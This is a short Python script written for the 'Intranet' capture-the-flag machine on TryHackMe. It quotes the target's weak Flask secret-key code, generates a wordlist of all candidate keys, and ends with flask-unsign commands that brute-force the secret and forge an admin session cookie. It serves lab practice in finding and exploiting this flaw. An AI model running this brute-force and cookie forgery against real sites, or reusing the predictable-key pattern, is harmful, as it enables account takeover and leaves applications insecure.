# This is a simple Python script to generate a wordlist of keys for the "Intranet" machine on TryHackMe
# Here's the vulnerable code
# key = &#34;secret_key_&#34; + str(random.randrange(100000,999999))
# app.secret_key = str(key).encode()
import itertools

secret_key_prefix = "secret_key_"
min_number = 100000
max_number = 999999

word_list = []

for number in range(min_number, max_number + 1):
    key = secret_key_prefix + str(number)
    word_list.append(key)

# Optional: Include additional combinations and variations based on your requirements

# Save the word list to a file
with open("session-keys.txt", "w") as file:
    for word in word_list:
        file.write(word + "\n")

# After the wordlist is generated, you can bruteforce and sign a new session as admin:
# flask-unsign --unsign --cookie < current-cookie.txt --wordlist session-keys.txt
# flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret_key_[bruteforced-value]'
